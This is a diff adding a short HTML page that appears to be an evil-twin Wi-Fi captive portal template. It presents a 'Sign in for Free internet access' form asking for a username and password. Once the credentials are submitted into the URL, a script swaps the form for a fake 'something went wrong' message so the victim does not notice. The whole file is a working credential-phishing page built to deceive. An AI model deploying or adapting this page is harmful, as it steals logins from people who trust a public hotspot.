@@ -1,0 +1,53 @@
+<html>
+<head>
+<title>WiFi Hotspot</title>
+
+<!--
+  The script is required to toggle between the login input fields and the "something went wrong" message.
+-->
+<script>
+	function getParamsPresent() {
+		var url = window.location.href;
+		var queryString = url ? url.split('?')[1] : window.location.search.slice(1);
+		var credentialsPage = document.getElementById('credentials');
+		var okPage = document.getElementById('ok');
+		if (queryString) {                            
+			credentialsPage.style.display = 'none';
+			okPage.style.display = 'block';
+		} else {
+			credentialsPage.style.display = 'block';
+			okPage.style.display = 'none';
+		}
+	}
+</script>
+
+</head>
+
+<body onload="getParamsPresent()">
+<h1>Portal Template</h1>
+<div id="credentials">
+  <p><b>Sign in for Free internet access.</b></p>
+  
+  <!--
+    Input login div - visibility will be toggled by the onload script
+  -->
+	<div class="login-page" >
+    	<div class="form" action="/">
+   		<form class="register-form">
+      	<input type="username" placeholder="Username" name="username"/>
+      	<input type="password" placeholder="Password" name="password"/>
+    	<input type="submit" value="Sign in">
+    	</form>
+    	</div>
+	</div>
+</div>
+
+<!--
+  "something went wrong" div - starts with display style none
+-->
+<div id="ok">
+	<p><b>Ups, something went wrong. We will look into this shortly.</b></p>
+</div>
+
+</body>
+</html>
